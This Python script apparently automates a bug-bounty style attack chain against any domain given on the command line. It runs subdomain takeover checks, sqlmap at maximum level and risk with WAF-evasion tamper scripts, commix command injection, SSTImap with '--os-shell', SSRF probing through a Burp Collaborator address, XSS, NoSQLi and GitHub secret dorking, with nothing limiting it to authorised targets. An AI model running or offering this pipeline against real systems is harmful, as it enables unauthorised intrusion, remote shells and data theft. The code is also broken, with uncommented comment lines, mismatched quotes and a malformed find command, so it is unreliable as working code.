import subprocess
import os
import argparse

def execute_command(command):
    subprocess.run(command, shell=True)

def print_subdomain_header(header_text):
    print("\033[1;31;40m\033[6;40m", header_text, "\033[0m")

def get_burp_collab_url():
    with open("burp_collab_add.txt", "r") as file:
        return file.read().strip()

def domains_search(domain, commands, output_dir):
     Execute each command for domain enumeration
    for i, (header_text, cmd) in enumerate(commands):
        if header_text:
            print_subdomain_header(header_text)
        cmd(domain, output_dir)
        
def main():
     Parse command-line arguments
    parser = argparse.ArgumentParser(description="Domain enumeration script")
    parser.add_argument("-d", "--domain", type=str, help="Domain to perform enumeration")
    args = parser.parse_args()

     Check if domain is provided
    if args.domain:
         Create output directory if it doesn't exist
        output_dir = os.path.join(os.path.dirname(__file__), "output")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

         Define commands for domain enumeration
        commands = [
             ("SubDomain Enumeration", lambda domain, output_dir: execute_command(f"bash Tools/SubEnum/subenum.sh -d {domain} -r -p")),
             ("", lambda domain, output_dir: execute_command(f"shuffledns -d {domain} -r dns-resolvers.txt -w subdomains-top1million-110000.txt | anew subs.txt")),
             ("", lambda domain, output_dir: subprocess.run(["cat", "subs.txt"] + [file for file in os.listdir() if file.startswith("resolved")], stdout=open("finalsubs.txt", "w"))),
             ("", lambda domain, output_dir: execute_command("cat finalsubs.txt | dnsx -silent | httpx | anew filterDNS.txt")),
             ("", lambda domain, output_dir: os.rename("filterDNS.txt", os.path.join(output_dir, "filterDNS.txt"))),
             ("", lambda domain, output_dir: execute_command(f"sed 's/https:\/\///' output/filterDNS.txt | anew > output/nonhttpsfilterDNS.txt")),
             ("Collecting URLS and Hidden Params ", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | anew > output/all_target_urls.txt")),
             ("", lambda domain, output_dir: execute_command(f"paramspider -l output/filterDNS.txt | anew > output/Params_list.txt")),
             ("SubDomain Takeover", lambda domain, output_dir: execute_command(f"python3 Tools/sub404/sub404.py -f output/filterDNS.txt  | anew output/Sub404result.txt")),
             ("", lambda domain, output_dir: execute_command(f"python3 Tools/sub404/sub404.py -d {domain} -p https | anew output/Sub404result1.txt")),
             ("", lambda domain, output_dir: execute_command(f"subjack -w output/filterDNS.txt -a -v | anew > output/subjackresults.txt")),
             ("CSRF Checks", lambda domain, output_dir: execute_command(f"xargs -a output/nonhttpsfilterDNS.txt -I{{}} sh -c 'xsrfprobe -u {{}} -d 5 -v --crawl --malicious -o output/csrf/ --no-verify --random-agent'")),
             ("", lambda domain, output_dir: execute_command(f"xargs -a output/nonhttpsfilterDNS.txt -I{{}} sh -c 'python3 Tools/Bolt/bolt.py -u {{}} -t 50 --delay 5 -l 2 | anew output/csrf/bolt_csrf_check.txt'")),
             ("HTTP Req Smuggling", lambda domain, output_dir: execute_command(f"cat output/all_target_urls.txt | python3 Tools/smuggler/smuggler.py -m GET,POST | anew > output/smuggler_results.txt")),
             ("Nuclei Running", lambda domain, output_dir: execute_command(f"nuclei  -l  output/filterDNS.txt -t Tools/nuclei-templates/ -o output/nuclei_abstract_scan.txt")),
             ("", lambda domain, output_dir: execute_command(f"nuclei  -l  output/all_target_urls.txt -t Tools/nuclei-templates/ -o output/nuclei_fullurls_scan.txt")),
             ("Command Injection", lambda domain, output_dir: execute_command(f"python3 Tools/commix/commix.py -m filterDNS.txt --batch --crawl=5 --all --smart ")),
             ("SSTI Running", lambda domain, output_dir: execute_command(f"python3 Tools/SSTImap/sstimap.py --load-urls output/all_target_urls.txt -A --delay 3 -l 5 --os-shell > output/SSTI_Allurls_Scans.txt")),
             ("", lambda domain, output_dir: execute_command(f"python3 Tools/SSTImap/sstimap.py --load-urls output/filterDNS.txt -A -c 5 --delay 3 -l 5 --os-shell > output/SSTI_scans.txt")),
             ("LFI Parameter Findings", lambda domain, output_dir: execute_command(f"cat all_target_urls.txt | sudo gf lfi | anew output/lfi_params.txt")),
             ("Github Recon", lambda domain, output_dir: execute_command(f"python3 Tools/gitGraber/gitGraber.py -k Tools/gitGraber/keywordsfile.txt -q \"{domain}\"  > output/gitrecon.txt")),
             ("Github Dorking", lambda domain, output_dir: execute_command(f"python3 Tools/GitDorker/GitDorker.py -tf Tools/GitDorker/tf/TOKENSFILE -q {domain}  -d Tools/GitDorker/Dorks/alldorksv3 > output/github_dorking.txt")),
             ("Host Header Injection Testing", lambda domain, output_dir: execute_command(f"bash  Tools/Host-Header-Injection-Vulnerability-Scanner/script.sh -l output/all_target_urls.txt  | anew > output/host_header_injection_results.txt")),
             ("Open Redirect Testing", lambda domain, output_dir: execute_command(f"python3  Tools/Oralyzer/oralyzer.py -l output/all_target_urls.txt -crlf | anew > output/OpenRedirect.txt")),
             ("Insecure Redirect Object References Urls", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | grep -E '\.json$|\.yaml$|\.xml$|\.action$|\.ashx$|\.aspx$|\.php$|\.phtml$|\.do$|\.jsp$|\.jspx$|\.wss$|\.do$|\.action$|\.htm$|\.html$|\.xhtml$|\.rss$|\.atom$|\.ics$|\.csv$|\.tsv$|\.pdf$|\.swf$|\.svg$|\.woff$|\.eot$|\.woff2$|\.tif$|\.tiff$|\.bmp$|\.png$|\.gif$|\.jpg$|\.jpeg$|\.webp$|\.ico$|\.svgz$|\.ttf$|\.otf$|\.mid$|\.midi$|\.mp3$|\.wav$|\.avi$|\.mov$|\.mpeg$|\.mpg$|\.mkv$|\.webm$|\.ogg$|\.ogv$|\.m4a$|\.m4v$|\.mp4$|\.flv$|\.wmv$' >  output/IDOR.txt")),
            ("Nmap Scans", lambda domain, output_dir: execute_command(f"sudo nmap  -sV -sC -A -Pn -v -p- --script='Tools/NSE/freevulnsearch/freevulnsearch.nse','Tools/NSE/nmap-vulners/vulners.nse','Tools/NSE/vulscan/vulscan.nse' -oN output/nmapScan.txt -iL output/nonhttpsfilterDNS.txt ")),
            ("SSRF Running", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | ./Tools/bulkssrf/target/release/bssrf -v -t 10 -l  {get_burp_collab_url()} | anew > output/bulkssrf_result.txt")),
            ("", lambda domain, output_dir: execute_command(f"cat output/all_target_urls.txt | ./Tools/ssrfuzz/ssrfuzz scan -x "GET","POST | anew ssrfuzz_results.txt")),
            ("", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | sudo gf ssrf | anew > output/ssrf_urls.txt")),
            ("SQLi Running", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | sudo gf sqli | anew > output/sqli_urls.txt")),
            ("", lambda domain, output_dir: execute_command(f"python3  Tools/sqlmap/sqlmap.py -m 'output/sqli_urls.txt' --tamper="between,randomcase,space2comment" --level=5 --risk=3 --time-sec=20 --random-agent -v 3 -b --batch   -f -a  | tee -a output/sqli_results_1.txt")),
            ("", lambda domain, output_dir: execute_command(f"python3  Tools/sqlmap/sqlmap.py -m 'output/sqli_urls.txt' --tamper="between,randomcase,space2comment" --level=5 --risk=3 --time-sec=20 --random-agent -v 3 -b --batch   -f -a  | tee -a output/sqli_results_1.txt")),
            ("", lambda domain, output_dir: execute_command(f"python3  Tools/sqlmap/sqlmap.py -m ‘output/sqli_urls.txt’ --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --level=5 --risk=3 --time-sec=20 --random-agent  -b --batch -f -a  | tee -a output/sqli_results_2.txt")),
              ("NOSQLi Running", lambda domain, output_dir: execute_command(f"xargs -a output/all_target_urls.txt -I{{}} sh -c './Tools/nosqli/main scan --insecure  -t {{}}' | tee -a  output/Nosqli_Scan_results.txt")),
              ("Reflect XSS Running", lambda domain, output_dir: execute_command(f"cat output/filterDNS.txt | gau | Gxss -p XSS | tee -a Reflect_XSS_urls.txt ")),
              ("", lambda domain, output_dir: execute_command(f"xargs -a output/filterDNS.txt -I{{}} sh -c 'python3 xsstrike.py -u {{}} --crawl  --blind' | tee -a output/XSS_Results_1.txt")),
              ("", lambda domain, output_dir: execute_command(f"xargs -a output/Reflect_XSS_urls.txt -I{{}} sh -c 'python3 Tools/XSStrike/xsstrike.py -u {{}} -f XSSPayloads.txt' | tee -a output/XSS_Results_2.txt")),
              
            
              ("", lambda domain, output_dir: execute_command(f"find . -name '*.txt' ! -path './output/*' ! -name 'dns-resolvers.txt' ! 'burp_collab_add.txt' ! -name 'subdomains-top1million-110000.txt' -delete")),
        ]

         Call the function to perform domain search with provided domain and commands
        domains_search(args.domain, commands, output_dir)
    else:
        print("Please provide a domain using the -d option.")

if __name__ == "__main__":
    main()

